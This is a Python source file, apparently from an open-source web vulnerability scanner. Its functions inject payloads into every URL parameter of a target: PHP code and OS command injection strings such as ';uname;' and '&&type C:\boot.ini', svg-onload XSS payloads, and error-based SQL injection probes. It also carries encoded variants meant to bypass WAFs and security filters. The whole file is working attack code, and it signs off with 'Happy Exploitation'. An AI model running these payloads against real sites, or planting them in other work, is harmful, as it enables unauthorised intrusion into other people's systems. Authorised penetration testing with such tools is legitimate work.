# Source code of Ebrahim Hegazy
# Copyright (C) 2013 Ebrahim Hegazy
# Copyright (C) 2023 shadmod <info@shadmod.it>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import re
import time
import urllib.request

from costants import (
    get_green,
    get_blue,
    get_bold,
    get_red,
    get_end,
)
from headers import (
    useragent,
    headers_reader,
)


def main_function(url, payloads, check):
    # This function is going to split the url and try to append payloads
    # in every parameter value.
    opener = urllib.request.urlopen(url)
    vuln = 0
    if opener.code == 999:
        # Detecting the WebKnight WAF from the StatusCode.
        print(get_red + " [~] WebKnight WAF Detected!" + get_end)
        print(get_red + " [~] Delaying 3 seconds between every request" + get_end)
        time.sleep(3)
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            print(bugs)
            request = useragent.open(bugs)
            html = request.readlines()
            for line in html:
                checker = re.findall(check, line)
                if len(checker) != 0:
                    print(get_red + " [*] Payload Found . . ." + get_end)
                    print(get_red + " [*] Payload: ", payload + get_end)
                    print(get_green + " [!] Code Snippet: " + get_end + line.strip())
                    print(get_blue + " [*] POC: " + get_end + bugs)
                    print(get_green + " [*] Happy Exploitation :D" + get_end)
                    vuln += 1
    if vuln == 0:
        print(get_green + " [!] Target is not vulnerable!" + get_end)
    else:
        print(
            get_blue + " [!] Congratulations you've found %i bugs :-) " % vuln + get_end
        )


# Here stands the vulnerabilities functions and detection payloads.
def rce_func(url):
    headers_reader(url)
    print(get_bold + " [!] Now Scanning for Remote Code/Command Execution " + get_end)
    print(get_blue + " [!] Covering Linux & Windows Operating Systems " + get_end)
    print(get_blue + " [!] Please wait ...." + get_end)
    # Remote Code Injection Payloads
    payloads = [";${@print(md5(zigoo0))}", ';${@print(md5("zigoo0"))}']
    # Below is the Encrypted Payloads to bypass some Security Filters & WAF's
    payloads += [
        "%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B"
    ]
    # Remote Command Execution Payloads
    payloads += [";uname;", "&&dir", "&&type C:\\boot.ini", ";phpinfo();", ";phpinfo"]
    # used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
    check = re.compile(
        "51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot",
        re.I,
    )
    main_function(url, payloads, check)


def xss_func(url):
    print(get_bold + "\n [!] Now Scanning for XSS " + get_end)
    print(get_blue + " [!] Please wait ...." + get_end)
    # Payload zigoo="css();" added for XSS in <a href TAG's
    payloads = [
        "%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
        "%78%22%78%3e%78",
    ]
    payloads += [
        "%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
        "zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
    ]
    check = re.compile("zigoo0<svg|x>x", re.I)
    main_function(url, payloads, check)


def error_based_sqli_func(url):
    print(get_bold + "\n [!] Now Scanning for Error Based SQL Injection " + get_end)
    print(
        get_blue
        + " [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases "
        + get_end
    )
    print(get_blue + " [!] Please wait ...." + get_end)
    # Yeah! let's bug the query :D :D \o/
    # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'
    # added chinese char to the SQLI payloads to bypass mysql_real_escape_*
    payloads = [
        "3'",
        "3%5c",
        "3%27%22%28%29",
        "3'><",
        "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27",
    ]
    check = re.compile(
        "Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error",
        re.I,
    )
    main_function(url, payloads, check)
